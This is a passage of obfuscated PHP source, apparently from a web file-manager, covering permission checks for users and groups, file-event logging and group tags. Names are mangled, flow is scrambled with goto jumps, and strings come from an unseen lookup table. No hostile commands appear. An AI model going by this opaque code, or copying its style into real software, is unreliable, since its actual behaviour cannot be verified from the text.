$this->sourceAuthInfo($B¬Š¤£Õõô[$b¥°íİ¦ğ[1870]]); } return $B¬Š¤£Õõô; } public function authArrayCheck($CÉàƒß¤Û, $Fá©ÓÁåî­ = false) { goto Cæâ”İí–; Cæâ”İí–: $FĞ°ï˜°í =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$CÉàƒß¤Û) { return array($FĞ°ï˜°í[405] => 0, $FĞ°ï˜°í[444] => !1); } $Fá©ÓÁåî­ = $Fá©ÓÁåî­ ? $Fá©ÓÁåî­ : USER_ID; goto E•Ï¹Å‹µ•; AÒÀ¨¤åÛ: return $d¥˜… ”…ƒ; goto d»§Æ´»œÃ; cÂê„Ì¾Ö¶: $eŸìœ‚Ë· = 1000; $f½µåĞÜ = 0; $EÀˆÎï¼áÕ = 0; goto A…»•¿à·—; f’ÛÈ¾ñéÚ: $Dô³ğ¯ÎŸª = 0; $EöğÉ†â = 0; $B©õ²°µÙ = 0; goto cÂê„Ì¾Ö¶; E•Ï¹Å‹µ•: $cÙìòØ¢¬‘ = 0; $B·Şµì‰¬˜ = 0; $D¶ê”¶õÒ÷ = 0; goto f’ÛÈ¾ñéÚ; B¬®Ì­¯¹: foreach ($CÉàƒß¤Û as $a–ç¯†óÅ†) { $DäÔÊôã = $this->authInfo($a–ç¯†óÅ†); if (!$DäÔÊôã) { continue; } $C¤ŸÅáÊ³ó = $a–ç¯†óÅ†[$FĞ°ï˜°í[482]]; $eÄ¿êçˆ Ú = intval($DäÔÊôã[$FĞ°ï˜°í[404]]); if ($a–ç¯†óÅ†[$FĞ°ï˜°í[402]] == SourceModel::TYPE_USER && $C¤ŸÅáÊ³ó == $Fá©ÓÁåî­) { $cÙìòØ¢¬‘ = !0; $D¶ê”¶õÒ÷ = $DäÔÊôã; $B·Şµì‰¬˜ = $eÄ¿êçˆ Ú; } else { if ($a–ç¯†óÅ†[$FĞ°ï˜°í[402]] == SourceModel::TYPE_GROUP && $this->groupContainUser($C¤ŸÅáÊ³ó, $Fá©ÓÁåî­)) { $Dô³ğ¯ÎŸª = !0; $Eù”Û®¾ƒ = $this->groupStepToUserGroup($C¤ŸÅáÊ³ó, $Fá©ÓÁåî­); if ($Eù”Û®¾ƒ < $eŸìœ‚Ë·) { $eŸìœ‚Ë· = $Eù”Û®¾ƒ; $EöğÉ†â = $eÄ¿êçˆ Ú; $B©õ²°µÙ = $DäÔÊôã; $f½µåĞÜ = $C¤ŸÅáÊ³ó; } if ($Eù”Û®¾ƒ == $eŸìœ‚Ë· && $eÄ¿êçˆ Ú >= $EöğÉ†â) { $EöğÉ†â = $eÄ¿êçˆ Ú; $B©õ²°µÙ = $DäÔÊôã; $f½µåĞÜ = $C¤ŸÅáÊ³ó; } } else { if ($C¤ŸÅáÊ³ó == $FĞ°ï˜°í[495]) { $EÀˆÎï¼áÕ = !0; $f“„È£Û±® = $DäÔÊôã; $eÓ—•Ìšç× = $eÄ¿êçˆ Ú; } } } } if ($cÙìòØ¢¬‘) { $fô“‡‡…áÈ = $B·Şµì‰¬˜; $DäÔÊôã = $D¶ê”¶õÒ÷; $a¯Äï”œ† = LNG($FĞ°ï˜°í[1871]); } else { if ($Dô³ğ¯ÎŸª) { $fô“‡‡…áÈ = $EöğÉ†â; $DäÔÊôã = $B©õ²°µÙ; $F¯ˆìÒÚÂ = Model($FĞ°ï˜°í[484])->getInfo($f½µåĞÜ); $a¯Äï”œ† = $FĞ°ï˜°í[160] . $F¯ˆìÒÚÂ[$FĞ°ï˜°í[489]] . $FĞ°ï˜°í[1872] . LNG($FĞ°ï˜°í[1873]); } else { if ($EÀˆÎï¼áÕ) { $fô“‡‡…áÈ = $eÓ—•Ìšç×; $DäÔÊôã = $f“„È£Û±®; $a¯Äï”œ† = LNG($FĞ°ï˜°í[1844]); } else { $fô“‡‡…áÈ = 0; $DäÔÊôã = !1; $a¯Äï”œ† = $FĞ°ï˜°í[33]; } } } $d¥˜… ”…ƒ = array($FĞ°ï˜°í[1863] => intval($fô“‡‡…áÈ), $FĞ°ï˜°í[1847] => $DäÔÊôã, $FĞ°ï˜°í[1864] => $a¯Äï”œ†, $FĞ°ï˜°í[1856] => $a–ç¯†óÅ†[$FĞ°ï˜°í[394]]); goto AÒÀ¨¤åÛ; A…»•¿à·—: $eÓ—•Ìšç× = 0; $f“„È£Û±® = 0; $a–ç¯†óÅ† = array($FĞ°ï˜°í[394] => 0); goto B¬®Ì­¯¹; d»§Æ´»œÃ: } private function groupContainUser($fÔõ‘ì¨Û§, $D‚êæñ‡¬® = false) { return in_array($fÔõ‘ì¨Û§, $this->userGroupParents($D‚êæñ‡¬®)); } private function groupStepToUserGroup($a¡ÓôùÇŒª, $D³ÏšÙ÷àº = false) { goto D »óãõåï; Aë½®†İç‰: return $fíÏ…«ŸÉÍ; goto fÖ³¶¨õá; D »óãõåï: $f‘º¾Ô‘Ğ¦ =& $_SERVER[Ïº«‚ßèÔˆø]; $C»ØíÙ›ó = $this->userGroupList($D³ÏšÙ÷àº); $fíÏ…«ŸÉÍ = 1000; goto d»¦¼—’äš; d»¦¼—’äš: $F»ñ¯Š»µ§ = $GLOBALS[$f‘º¾Ô‘Ğ¦[6]][$f‘º¾Ô‘Ğ¦[88]][$f‘º¾Ô‘Ğ¦[1763]] == 1; $E‘ñ ˆÍàß = $F»ñ¯Š»µ§ ? 3 : 2; foreach ($C»ØíÙ›ó as $FŸá¹¸ÏÌ¹) { if ($FŸá¹¸ÏÌ¹[$f‘º¾Ô‘Ğ¦[1671]] == $a¡ÓôùÇŒª) { return 0; } $Fø©¨†Š„é = explode($f‘º¾Ô‘Ğ¦[47], trim($FŸá¹¸ÏÌ¹[$f‘º¾Ô‘Ğ¦[485]], $f‘º¾Ô‘Ğ¦[47])); if ($Fø©¨†Š„é[0] == $f‘º¾Ô‘Ğ¦[495] && count($Fø©¨†Š„é) > $E‘ñ ˆÍàß) { $Bğ×ˆ½†©„ = array_reverse(array_slice($Fø©¨†Š„é, $E‘ñ ˆÍàß)); $B‡œñôøù = array_search($a¡ÓôùÇŒª, $Bğ×ˆ½†©„); if ($B‡œñôøù !== !1 && $B‡œñôøù + 1 <= $fíÏ…«ŸÉÍ) { $fíÏ…«ŸÉÍ = $B‡œñôøù + 1; } } } goto Aë½®†İç‰; fÖ³¶¨õá: } private function userGroupList($a°¥¶“©è = false) { $eí­ñ˜ß³ø =& $_SERVER[Ïº«‚ßèÔˆø]; static $B½¡…•ğÈ = array(); if (isset($B½¡…•ğÈ[$a°¥¶“©è])) { return $B½¡…•ğÈ[$a°¥¶“©è]; } $d’ÓÎÛ¤È = Model($eí­ñ˜ß³ø[505])->getInfo($a°¥¶“©è); $B½¡…•ğÈ[$a°¥¶“©è] = array_to_keyvalue($d’ÓÎÛ¤È[$eí­ñ˜ß³ø[1845]], $eí­ñ˜ß³ø[1671]); return $B½¡…•ğÈ[$a°¥¶“©è]; } public function userGroupParents($aêæå›î¯Ê) { goto Cì¢À¼•†›; Cì¢À¼•†›: $a±Œ¬¬‘ï =& $_SERVER[Ïº«‚ßèÔˆø]; static $c‹ÍĞ­¹ß¶ = array(); $aêæå›î¯Ê = $aêæå›î¯Ê ? $aêæå›î¯Ê : USER_ID; goto AÜÜáöêá¶; AÜÜáöêá¶: if (isset($c‹ÍĞ­¹ß¶[$aêæå›î¯Ê])) { return $c‹ÍĞ­¹ß¶[$aêæå›î¯Ê]; } $bÚ×òï’¼ = $this->userGroupList($aêæå›î¯Ê); $B±‡õ¾Õ¿Ê = array(); goto D²Ãéµö‹„; CÎ¶î¡¿ğˆ: $c‹ÍĞ­¹ß¶[$aêæå›î¯Ê] = array_unique($B±‡õ¾Õ¿Ê); return $c‹ÍĞ­¹ß¶[$aêæå›î¯Ê]; goto díÇâµÏô; D²Ãéµö‹„: $Fùİª¯‰’Ï = $GLOBALS[$a±Œ¬¬‘ï[6]][$a±Œ¬¬‘ï[88]][$a±Œ¬¬‘ï[1763]] == 1; $D¯ï¼é’ = $Fùİª¯‰’Ï ? 3 : 2; foreach ($bÚ×òï’¼ as $f…ÑëØéâ) { $dÙïÓôƒÃƒ = array($f…ÑëØéâ[$a±Œ¬¬‘ï[1671]]); $fÅÓµ·°šô = explode($a±Œ¬¬‘ï[47], trim($f…ÑëØéâ[$a±Œ¬¬‘ï[485]], $a±Œ¬¬‘ï[47])); if ($fÅÓµ·°šô[0] == $a±Œ¬¬‘ï[495] && count($fÅÓµ·°šô) > $D¯ï¼é’) { $c­ê´¦Ë¾ï = array_slice($fÅÓµ·°šô, $D¯ï¼é’); $dÙïÓôƒÃƒ = array_merge($dÙïÓôƒÃƒ, array_reverse($c­ê´¦Ë¾ï)); } $B±‡õ¾Õ¿Ê = array_merge($B±‡õ¾Õ¿Ê, $dÙïÓôƒÃƒ); } goto CÎ¶î¡¿ğˆ; díÇâµÏô: } public function authTargetInfoMake($C·ãŒÒçæ‡) { goto Dô÷íõä”Ë; D½¿ñø…Áì: return array($dŠĞ‚ƒ¹Ÿ‚[1875] => $E¼ÌÈĞõÎà, $dŠĞ‚ƒ¹Ÿ‚[1876] => $Dæ³ØÏ‡í); goto cŒ‡ß­ò¶¹; Dô÷íõä”Ë: $dŠĞ‚ƒ¹Ÿ‚ =& $_SERVER[Ïº«‚ßèÔˆø]; $E¼ÌÈĞõÎà = array(); $Dæ³ØÏ‡í = array(); goto c‰ƒ›å×‡™; c‰ƒ›å×‡™: foreach ($C·ãŒÒçæ‡ as $CÖËáë©‡) { if ($CÖËáë©‡[$dŠĞ‚ƒ¹Ÿ‚[402]] == SourceModel::TYPE_USER) { $E¼ÌÈĞõÎà[] = intval($CÖËáë©‡[$dŠĞ‚ƒ¹Ÿ‚[482]]); } else { if ($CÖËáë©‡[$dŠĞ‚ƒ¹Ÿ‚[402]] == SourceModel::TYPE_GROUP) { $Dæ³ØÏ‡í[] = intval($CÖËáë©‡[$dŠĞ‚ƒ¹Ÿ‚[482]]); } } } if ($E¼ÌÈĞõÎà) { $E¼ÌÈĞõÎà = Model($dŠĞ‚ƒ¹Ÿ‚[501])->userListInfo($E¼ÌÈĞõÎà); } if ($Dæ³ØÏ‡í) { $eÂçˆ³Ä¨ˆ = array($dŠĞ‚ƒ¹Ÿ‚[1749] => array($dŠĞ‚ƒ¹Ÿ‚[409], $Dæ³ØÏ‡í)); $Dæ³ØÏ‡í = Model($dŠĞ‚ƒ¹Ÿ‚[484])->field($dŠĞ‚ƒ¹Ÿ‚[1874])->where($eÂçˆ³Ä¨ˆ)->select(); $Dæ³ØÏ‡í = array_to_keyvalue($Dæ³ØÏ‡í, $dŠĞ‚ƒ¹Ÿ‚[1671]); } goto D½¿ñø…Áì; cŒ‡ß­ò¶¹: } public function authInfo($cÅ‰Æ——‰) { $cæÂÃƒŞ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($cÅ‰Æ——‰[$cæÂÃƒŞ[1766]]) { $Cì»Ø—¶× = Model($cæÂÃƒŞ[1838])->listData($cÅ‰Æ——‰[$cæÂÃƒŞ[1766]]); if (!$Cì»Ø—¶×) { return !1; $aéĞŠƒÄÜš = Model($cæÂÃƒŞ[1838])->listData(); $eÒØÄ†‘Ã = array_filter_by_field($aéĞŠƒÄÜš, $cæÂÃƒŞ[404], $cæÂÃƒŞ[495]); return $eÒØÄ†‘Ã; } $BÆæœˆÃº = array_field_key($Cì»Ø—¶×, array($cæÂÃƒŞ[392], $cæÂÃƒŞ[28], $cæÂÃƒŞ[404], $cæÂÃƒŞ[1692], $cæÂÃƒŞ[1694])); $BÆæœˆÃº[$cæÂÃƒŞ[1877]] = $cÅ‰Æ——‰; return $BÆæœˆÃº; } else { return array($cæÂÃƒŞ[410] => 0, $cæÂÃƒŞ[1677] => $cÅ‰Æ——‰[$cæÂÃƒŞ[1820]], $cæÂÃƒŞ[411] => $cæÂÃƒŞ[33], $cæÂÃƒŞ[1692] => $cæÂÃƒŞ[1878]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\162\x63\145\x5f\x65\166\x65\156\164"; protected $dataAuto = array(array("\143\x72\x65\141\x74\145\124\x69\155\145", "\164\151\x6d\145", "\x69\x6e\x73\145\162\164", "\x66\x75\156\143\164\151\157\x6e"), array("\144\145\163\143", '', "\x69\x6e\x73\145\x72\164\x2c\x75\160\x64\x61\164\145\x2c\163\x65\154\x65\x63\x74", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($a¯ƒà¯ ½», $E÷œÈ‡éÜ, $eÛª‡ƒÍ’¿ = '') { goto CœíÂÆº¡ƒ; c©×˜ÆÀ‰®: return $this->add($C‡±ê’¤è); goto BÅäˆº¤Ë; b‚ÂÆ‘Ğß½: if (!$c¤‘íÃ˜“·) { return !1; } if ($this->isCacheEvent($c¤‘íÃ˜“·, $E÷œÈ‡éÜ)) { return; } if ($eÛª‡ƒÍ’¿ && is_string($eÛª‡ƒÍ’¿)) { $eÛª‡ƒÍ’¿ = array($eè¨ˆ‰Õº[1704] => $eÛª‡ƒÍ’¿); } goto eäŠƒ‘Í; eäŠƒ‘Í: $C‡±ê’¤è = array($eè¨ˆ‰Õº[408] => $a¯ƒà¯ ½», $eè¨ˆ‰Õº[1879] => $c¤‘íÃ˜“·[$eè¨ˆ‰Õº[476]], $eè¨ˆ‰Õº[1880] => $c¤‘íÃ˜“·[$eè¨ˆ‰Õº[28]], $eè¨ˆ‰Õº[493] => $c¤‘íÃ˜“·[$eè¨ˆ‰Õº[493]], $eè¨ˆ‰Õº[1500] => USER_ID, $eè¨ˆ‰Õº[413] => $E÷œÈ‡éÜ, $eè¨ˆ‰Õº[1502] => $eÛª‡ƒÍ’¿); $this->addSystemLog($E÷œÈ‡éÜ, $C‡±ê’¤è); unset($C‡±ê’¤è[$eè¨ˆ‰Õº[1880]], $C‡±ê’¤è[$eè¨ˆ‰Õº[493]]); goto c©×˜ÆÀ‰®; CœíÂÆº¡ƒ: $eè¨ˆ‰Õº =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->eventSave) { return; } $c¤‘íÃ˜“· = Model($eè¨ˆ‰Õº[1187])->sourceInfo($a¯ƒà¯ ½»); goto b‚ÂÆ‘Ğß½; BÅäˆº¤Ë: } private function addSystemLog($AÈ‘Ïõ‡ì˜, $bÓ§ÈöÉê‚) { $cœĞ¦ã×ˆè =& $_SERVER[Ïº«‚ßèÔˆø]; if ($AÈ‘Ïõ‡ì˜ == $cœĞ¦ã×ˆè[1881]) { $AÈ‘Ïõ‡ì˜ = $bÓ§ÈöÉê‚[$cœĞ¦ã×ˆè[429]][$cœĞ¦ã×ˆè[1882]]; } else { if (in_array($AÈ‘Ïõ‡ì˜, array($cœĞ¦ã×ˆè[1648], $cœĞ¦ã×ˆè[1883]))) { $AÈ‘Ïõ‡ì˜ = $bÓ§ÈöÉê‚[$cœĞ¦ã×ˆè[429]][$cœĞ¦ã×ˆè[700]]; } } $fô¡÷ãó²¤ = array_merge($bÓ§ÈöÉê‚, array($cœĞ¦ã×ˆè[1884] => $bÓ§ÈöÉê‚[$cœĞ¦ã×ˆè[394]], $cœĞ¦ã×ˆè[1885] => $bÓ§ÈöÉê‚[$cœĞ¦ã×ˆè[1885]])); Model($cœĞ¦ã×ˆè[1612])->addLog($cœĞ¦ã×ˆè[1886] . $AÈ‘Ïõ‡ì˜, $fô¡÷ãó²¤); } private function isCacheEvent($B÷©çô¢—, $d¸œ¨š¿‡—) { if ($B÷©çô¢—[$_SERVER[Ïº«‚ßèÔˆø][402]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($BïŠ‚šßó¨, $cî§°¹Ú¬ó) { $b®Ñ‚å¸Õ =& $_SERVER[Ïº«‚ßèÔˆø]; $D¾’¥³íŠ» = Model($b®Ñ‚å¸Õ[1187])->sourceInfo($BïŠ‚šßó¨); $BƒøƒÄèì = array($b®Ñ‚å¸Õ[1882] => $cî§°¹Ú¬ó, $b®Ñ‚å¸Õ[28] => $D¾’¥³íŠ»[$b®Ñ‚å¸Õ[28]]); return $this->addEvent($BïŠ‚šßó¨, $b®Ñ‚å¸Õ[1881], $BƒøƒÄèì); } public function eventFileEdit($c³òáãÈ§) { $eÙßµ¯ÕÀ› =& $_SERVER[Ïº«‚ßèÔˆø]; $FÚÕ­‚Ó„¤ = array($eÙßµ¯ÕÀ›[1887] => $_SERVER[$eÙßµ¯ÕÀ›[1888]], $eÙßµ¯ÕÀ›[1889] => strtolower(ACTION)); return $this->addEvent($c³òáãÈ§, $eÙßµ¯ÕÀ›[1638], $FÚÕ­‚Ó„¤); } public function eventRecycle($d¤´ÆÆ«, $eöëÅõÍà…) { return $this->addEvent($d¤´ÆÆ«, $_SERVER[Ïº«‚ßèÔˆø][1883], $eöëÅõÍà…); } public function eventRemove($D‹£ÊÒƒÈ) { $dëà‡Ğâ¬É =& $_SERVER[Ïº«‚ßèÔˆø]; $C—ôé²Üˆª = Model($dëà‡Ğâ¬É[1187])->sourceInfo($D‹£ÊÒƒÈ); $AÌ–°×ÜñÖ = $C—ôé²Üˆª[$dëà‡Ğâ¬É[28]]; return $this->addEvent($C—ôé²Üˆª[$dëà‡Ğâ¬É[476]], $dëà‡Ğâ¬É[1637], $AÌ–°×ÜñÖ); } public function eventShare($fôßŞŠÒ, $F­µº›ñíš) { return $this->addEvent($fôßŞŠÒ, $_SERVER[Ïº«‚ßèÔˆø][1648], $F­µº›ñíš); } public function eventMove($aí®ñÓ–Š­, $C£ÊŠ¯¬­‘, $c°Ø‚ïÜˆ…) { goto Bˆç§»À·; Bˆç§»À·: $FËÛØ§æÊ¼ =& $_SERVER[Ïº«‚ßèÔˆø]; $E–¯Ê¦Áêğ = Model($FËÛØ§æÊ¼[1187]); $FÃ ¥‹¨‡ë = $E–¯Ê¦Áêğ->sourceInfo($aí®ñÓ–Š­); goto FÂÊå™‰Ôœ; CÓ²òß†‘¹: $this->addEvent($aí®ñÓ–Š­, $FËÛØ§æÊ¼[519], $a®ÎÊ´Õ±è); $FÃ ¥‹¨‡ë = $E–¯Ê¦Áêğ->sourceInfo($aí®ñÓ–Š­); $a®ÎÊ´Õ±è = array($FËÛØ§æÊ¼[394] => $FÃ ¥‹¨‡ë[$FËÛØ§æÊ¼[394]], $FËÛØ§æÊ¼[28] => $FÃ ¥‹¨‡ë[$FËÛØ§æÊ¼[28]]); goto C˜¼Âäœ; C˜¼Âäœ: $this->addEvent($C£ÊŠ¯¬­‘, $FËÛØ§æÊ¼[1893], $a®ÎÊ´Õ±è); goto Fí‡­õÅ„Î; FÂÊå™‰Ôœ: $C„òö«§·¥ = $E–¯Ê¦Áêğ->sourceInfo($C£ÊŠ¯¬­‘); $CçØïÏÏ = $E–¯Ê¦Áêğ->sourceInfo($c°Ø‚ïÜˆ…); $a®ÎÊ´Õ±è = array($FËÛØ§æÊ¼[1038] => $C£ÊŠ¯¬­‘, $FËÛØ§æÊ¼[1890] => $C„òö«§·¥[$FËÛØ§æÊ¼[28]], $FËÛØ§æÊ¼[1870] => $C„òö«§·¥[$FËÛØ§æÊ¼[493]], $FËÛØ§æÊ¼[1039] => $c°Ø‚ïÜˆ…, $FËÛØ§æÊ¼[1891] => $CçØïÏÏ[$FËÛØ§æÊ¼[28]], $FËÛØ§æÊ¼[1892] => $CçØïÏÏ[$FËÛØ§æÊ¼[493]]); goto CÓ²òß†‘¹; Fí‡­õÅ„Î: } public function eventCopy($B÷â‡¿âÍ) { $this->eventCreate($B÷â‡¿âÍ, $_SERVER[Ïº«‚ßèÔˆø][517]); } public function eventRename($B±¶ÔŒê†ğ, $CÏÓÍ´Ÿ£â, $a¼Š¿©ğÄ¦) { $aù·¹¼ïéÑ =& $_SERVER[Ïº«‚ßèÔˆø]; $C’‡ÎïĞ° = array($aù·¹¼ïéÑ[1038] => $CÏÓÍ´Ÿ£â, $aù·¹¼ïéÑ[1039] => $a¼Š¿©ğÄ¦); return $this->addEvent($B±¶ÔŒê†ğ, $aù·¹¼ïéÑ[1201], $C’‡ÎïĞ°); } public function eventAddComment($A‘„¿àŠÏÒ, $a‰³§º©ƒ) { return $this->addEvent($A‘„¿àŠÏÒ, $_SERVER[Ïº«‚ßèÔˆø][1894], $a‰³§º©ƒ); } public function eventAddDesc($FòÊŠÛÊÌ§, $c°®Ô÷ÚØ) { return $this->addEvent($FòÊŠÛÊÌ§, $_SERVER[Ïº«‚ßèÔˆø][1895], $c°®Ô÷ÚØ); } public function listBySource($f…±£ö¤»É) { goto D„ïâ§ì ‰; e§Æç–‡Ğ¢: if ($f…¼®­±âÑ[$Cº²Áˆ¦Ô[401]] == $Cº²Áˆ¦Ô[87]) { $E±ÌÕ”Œêá = Model($Cº²Áˆ¦Ô[1187])->listSearchChildren($f…±£ö¤»É, 20000); $E±ÌÕ”Œêá[] = $f…±£ö¤»É . $Cº²Áˆ¦Ô[374]; $E½š§–ºß = array($Cº²Áˆ¦Ô[394] => array($Cº²Áˆ¦Ô[7], $E±ÌÕ”Œêá)); } $DŸ½Ìè‹ĞÖ = $this->where($E½š§–ºß)->order($Cº²Áˆ¦Ô[1896])->selectPage(); if ($DŸ½Ìè‹ĞÖ[$Cº²Áˆ¦Ô[363]][$Cº²Áˆ¦Ô[364]] == 0) { $DŸ½Ìè‹ĞÖ[$Cº²Áˆ¦Ô[363]][$Cº²Áˆ¦Ô[364]] = 1; $DŸ½Ìè‹ĞÖ[$Cº²Áˆ¦Ô[366]] = array(array($Cº²Áˆ¦Ô[408] => $f…±£ö¤»É, $Cº²Áˆ¦Ô[1879] => $f…¼®­±âÑ[$Cº²Áˆ¦Ô[476]], $Cº²Áˆ¦Ô[1500] => $f…¼®­±âÑ[$Cº²Áˆ¦Ô[430]], $Cº²Áˆ¦Ô[413] => $Cº²Áˆ¦Ô[1897], $Cº²Áˆ¦Ô[414] => $f…¼®­±âÑ[$Cº²Áˆ¦Ô[193]], $Cº²Áˆ¦Ô[1502] => $Cº²Áˆ¦Ô[33])); } goto AÃª–Úíêæ; AÃª–Úíêæ: return $this->eventListParse($DŸ½Ìè‹ĞÖ, $f…±£ö¤»É); goto cÉÕÚğ¢¸æ; D„ïâ§ì ‰: $Cº²Áˆ¦Ô =& $_SERVER[Ïº«‚ßèÔˆø]; $f…¼®­±âÑ = Model($Cº²Áˆ¦Ô[1187])->sourceInfo($f…±£ö¤»É); $E½š§–ºß = array($Cº²Áˆ¦Ô[408] => $f…±£ö¤»É); goto e§Æç–‡Ğ¢; cÉÕÚğ¢¸æ: } private function eventListParse($DÜ‰¤×Æ…, $B£¥—öÏáÂ) { goto bï‚£÷‡ª; B‘Äµî”Ï: $e–òæÌ´êÄ = array_unique($e–òæÌ´êÄ); $f¢ã¿ÎÓ = array_unique(array_to_keyvalue($a”ƒ­ÕÂ‰, $aÃõ–ÈÃ®[33], $aÃõ–ÈÃ®[1508])); $fË‡ßë¬š‰ = Model($aÃõ–ÈÃ®[505])->userListInfo($f¢ã¿ÎÓ); goto B¥ß‚ˆ…’ã; B¥ß‚ˆ…’ã: $d¸²Ëì”ãï = Model($aÃõ–ÈÃ®[782])->sourceListInfo($e–òæÌ´êÄ, !0); foreach ($a”ƒ­ÕÂ‰ as &$AËßÁ×ñÄ) { if ($AËßÁ×ñÄ[$aÃõ–ÈÃ®[29]] == $aÃõ–ÈÃ®[519] && isset($AËßÁ×ñÄ[$aÃõ–ÈÃ®[429]][$aÃõ–ÈÃ®[1038]])) { $AËßÁ×ñÄ[$aÃõ–ÈÃ®[429]][$aÃõ–ÈÃ®[1038]] = $d¸²Ëì”ãï[$AËßÁ×ñÄ[$aÃõ–ÈÃ®[429]][$aÃõ–ÈÃ®[1038]]]; $AËßÁ×ñÄ[$aÃõ–ÈÃ®[429]][$aÃõ–ÈÃ®[1039]] = $d¸²Ëì”ãï[$AËßÁ×ñÄ[$aÃõ–ÈÃ®[429]][$aÃõ–ÈÃ®[1039]]]; } if ($AËßÁ×ñÄ[$aÃõ–ÈÃ®[29]] == $aÃõ–ÈÃ®[1893] && isset($AËßÁ×ñÄ[$aÃõ–ÈÃ®[429]][$aÃõ–ÈÃ®[394]])) { $AËßÁ×ñÄ[$aÃõ–ÈÃ®[429]][$aÃõ–ÈÃ®[394]] = $d¸²Ëì”ãï[$AËßÁ×ñÄ[$aÃõ–ÈÃ®[429]][$aÃõ–ÈÃ®[394]]]; } $AËßÁ×ñÄ[$aÃõ–ÈÃ®[85]] = $d¸²Ëì”ãï[$AËßÁ×ñÄ[$aÃõ–ÈÃ®[394]]]; $AËßÁ×ñÄ[$aÃõ–ÈÃ®[1898]] = $d¸²Ëì”ãï[$AËßÁ×ñÄ[$aÃõ–ÈÃ®[1885]]]; if ($AËßÁ×ñÄ[$aÃõ–ÈÃ®[29]] == $aÃõ–ÈÃ®[1637]) { $AËßÁ×ñÄ[$aÃõ–ÈÃ®[1898]] = $AËßÁ×ñÄ[$aÃõ–ÈÃ®[85]]; $AËßÁ×ñÄ[$aÃõ–ÈÃ®[1885]] = $AËßÁ×ñÄ[$aÃõ–ÈÃ®[1898]][$aÃõ–ÈÃ®[394]]; $AËßÁ×ñÄ[$aÃõ–ÈÃ®[85]] = !1; $AËßÁ×ñÄ[$aÃõ–ÈÃ®[394]] = $aÃõ–ÈÃ®[33]; } $AËßÁ×ñÄ[$aÃõ–ÈÃ®[1828]] = $fË‡ßë¬š‰[$AËßÁ×ñÄ[$aÃõ–ÈÃ®[1508]]]; } unset($AËßÁ×ñÄ); goto bÇ£›¼Æå; bÇ£›¼Æå: $DÜ‰¤×Æ…[$aÃõ–ÈÃ®[366]] = $a”ƒ­ÕÂ‰; return $DÜ‰¤×Æ…; goto d—èÄ‡‚Äô; cåø¨¶Ÿæ: $D¹†Ñˆ·Ğ = array_to_keyvalue($a”ƒ­ÕÂ‰, $aÃõ–ÈÃ®[33], $aÃõ–ÈÃ®[1885]); foreach ($a”ƒ­ÕÂ‰ as $AËßÁ×ñÄ) { $B¥àÌŒÇÈ“ = $AËßÁ×ñÄ[$aÃõ–ÈÃ®[429]]; if ($AËßÁ×ñÄ[$aÃõ–ÈÃ®[29]] == $aÃõ–ÈÃ®[519] && isset($B¥àÌŒÇÈ“[$aÃõ–ÈÃ®[1038]])) { $e–òæÌ´êÄ[] = $B¥àÌŒÇÈ“[$aÃõ–ÈÃ®[1038]] . $aÃõ–ÈÃ®[33]; $e–òæÌ´êÄ[] = $B¥àÌŒÇÈ“[$aÃõ–ÈÃ®[1039]] . $aÃõ–ÈÃ®[33]; } if ($AËßÁ×ñÄ[$aÃõ–ÈÃ®[29]] == $aÃõ–ÈÃ®[1893] && isset($B¥àÌŒÇÈ“[$aÃõ–ÈÃ®[394]])) { $e–òæÌ´êÄ[] = $B¥àÌŒÇÈ“[$aÃõ–ÈÃ®[394]] . $aÃõ–ÈÃ®[33]; } } $e–òæÌ´êÄ = array_merge($e–òæÌ´êÄ, $D¹†Ñˆ·Ğ, array($B£¥—öÏáÂ . $aÃõ–ÈÃ®[33])); goto B‘Äµî”Ï; bï‚£÷‡ª: $aÃõ–ÈÃ® =& $_SERVER[Ïº«‚ßèÔˆø]; $a”ƒ­ÕÂ‰ = $DÜ‰¤×Æ…[$aÃõ–ÈÃ®[366]]; $e–òæÌ´êÄ = array_to_keyvalue($a”ƒ­ÕÂ‰, $aÃõ–ÈÃ®[33], $aÃõ–ÈÃ®[394]); goto cåø¨¶Ÿæ; d—èÄ‡‚Äô: } public function removeBySource($aİ÷ÂÑé“†) { $c•‚«ê¯¯ = array($_SERVER[Ïº«‚ßèÔˆø][408] => $aİ÷ÂÑé“†); $this->where($c•‚«ê¯¯)->remove(); } } goto cƒ“ èË¿; d¬¥¤–¸‹ˆ: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\146\141\x76"; protected function cacheFunctionAlias($B‚ë›ÙæÚÜ) { $C¢—áîã =& $_SERVER[Ïº«‚ßèÔˆø]; return array($C¢—áîã[1771] => array($B‚ë›ÙæÚÜ[0], $C¢—áîã[1772]), $C¢—áîã[1773] => array($B‚ë›ÙæÚÜ[0], $C¢—áîã[1774])); } protected function get($F”–„öÂá¦) { $Bô‹ÏçÉù… =& $_SERVER[Ïº«‚ßèÔˆø]; $Aˆ¯‡ã±ŠÀ = Model($Bô‹ÏçÉù…[484])->metaGet($F”–„öÂá¦, $Bô‹ÏçÉù…[1775]); $aóòøòªï = json_decode($Aˆ¯‡ã±ŠÀ, !0); return $aóòøòªï ? $aóòøòªï : array($Bô‹ÏçÉù…[1776] => $Bô‹ÏçÉù…[87], $Bô‹ÏçÉù…[366] => array()); } protected function set($dêò¸íÑ†ã, $Dõ²Úºè·—) { $a­ÚÎÒºì£ =& $_SERVER[Ïº«‚ßèÔˆø]; $Dõ²Úºè·— = $Dõ²Úºè·— ? $Dõ²Úºè·— : array($a­ÚÎÒºì£[1776] => $a­ÚÎÒºì£[87], $a­ÚÎÒºì£[366] => array()); Model($a­ÚÎÒºì£[484])->metaSet($dêò¸íÑ†ã, $a­ÚÎÒºì£[1775], json_encode($Dõ²Úºè·—)); return Model($a­ÚÎÒºì£[484])->metaSet($dêò¸íÑ†ã, $a­ÚÎÒºì£[1775], json_encode($Dõ²Úºè·—)); } protected function getByTagID($bØ¾¾Î‘†‡, $F£±õÕœÉø) { goto D„¹ˆóòÖ; e¿…îš±Ê¸: $DĞ‡âå = $this->get($bØ¾¾Î‘†‡); if (!$DĞ‡âå || !isset($DĞ‡âå[$eĞ£Å¢âà[366]])) { return !1; } $CÖ£Š—’¹É = array_find_by_field($DĞ‡âå[$eĞ£Å¢âà[366]], $eĞ£Å¢âà[392], $F£±õÕœÉø); goto Cä„®Ë¬ùá; 